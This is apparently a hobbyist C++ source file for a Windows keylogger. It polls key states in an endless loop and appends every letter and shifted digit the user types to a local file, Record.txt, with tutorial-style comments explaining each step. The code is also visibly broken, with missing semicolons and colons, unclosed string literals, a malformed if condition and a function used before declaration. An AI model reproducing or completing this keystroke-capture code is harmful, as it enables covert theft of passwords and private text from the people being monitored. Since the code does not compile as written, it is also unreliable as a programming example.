#include  <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;


int main()
  {
    log(); 
    return 0;
  }


void log()
{
    char key;
  
     for (;;)
  {    
       //Sleep (0); //pause the program for amount of milliseconds. 0 tells is whenever a nother prgeam wants to use cpu you will replquish conrtoll. wont interfear with process
       for ( key=8; key <=222; key++)
       {
         //UPPER or lowercase Check
         if(GetAsyncKeyState(key) == - 32767) //Conditional If statement to see if someone presses 
         //a key, if they do then please do soemthing with it 
         {
           ofstream write ("Record.txt", ios::app);
         
             if (key>64)&&(key<91) && !(GetAsyncKeyState(0x10)) //hex for shift is 0x10, determines if shift is not pressed then add 32 to these values, making the letteres enters in ascii as lowercase.
             { //Greater than 64. @=64 A=65, so anything from 65(A). Less than 91, 91=[ 90 = Z, Till anything up to 90 (Z)   
               key+=32; //If shift key is pressed use those numbers, if not add 32, as 65+32=97. 97=a, +32 on ascii gives lowecase value of letter, allowing us to detrmine between upper and lowecase
               write << key; // this is done by constantly checking the status of the shift key.
               write.close();
               break;
             }
             else if((key>64)&&(key<91))
             {
               write << key;
               write.close();
               break;
             }
           //How to get sybols in the log
           //statment to get ! as it is shift+1, the log needs to know to put ! not Shift+1
           //Using and If and switch statement to get better efficiency 
           else  
           {
               switch (key)
               {
                 case 48: 
                   {
                     if (GetAsyncKeyState(0x10)) 
                         write << ")";
                     else
                       write << "0";
                   }
                   break;
                    case 49: //ascii value for 1=49 
                   {
                     if (GetAsyncKeyState(0x10)) //Get state of the shift key 
                         write << "!"; //Means if the shift key is pressed when the user types 1 then change it to !.
                     else
                       write << "1";
                   }
                   break;
                    case 50: 
                   {
                     if (GetAsyncKeyState(0x10))
                         write << "\"" ; 
                     else
                       write << "2";
                   }
                   break;
                    case 51: 
                   {
                     if (GetAsyncKeyState(0x10)) 
                         write << "£"; 
                     else 
                       write << "3";
                   }
                   break;
                    case 52: 
                   {
                     if (GetAsyncKeyState(0x10)) 
                         write << "$"
                     else 
                       write << "4;
                   }
                   break;
                    case 53  
                   {
                     if (GetAsyncKeyState(0x10)) 
                         write << "%" 
                     else 
                       write << "5;
                   }
                   break;
                    case 54  
                   {
                     if (GetAsyncKeyState(0x10)) 
                         write << "^";
                     else 
                       write << "6;
                   }
                   break;
                    case 55 
                   {
                     if (GetAsyncKeyState(0x10)) 
                         write << "&"; 
                      else 
                        write << "7";
                   }
                   break;
                    case 56: 
                   {
                     if (GetAsyncKeyState(0x10)) 
                         write << "*"; 
                     else
                       write << "8";
                   }
                   break;
                    case 57: 
                   {
                     if (GetAsyncKeyState(0x10))  
                         write << "("; 
                     else 
                       write << "9";
                   }
                   break;
               }
           }
           
              /*          switch(c)
             {
                 case 8:   write << "<BackSpace>"; //8 in ascii is backspace so this is to change it so on log it shows as backspace 
                 case 127: write << "<Delete>"; //127 is delete key, will show as Delete
                 case 32:  write << " "; //32 is a space, replace with a space
                 case 13:  write << "<Enter>\n"; //13 is enter, Will make enter 
                 default:  write << c;
             }
             */
      
         }
       }
  }
}  
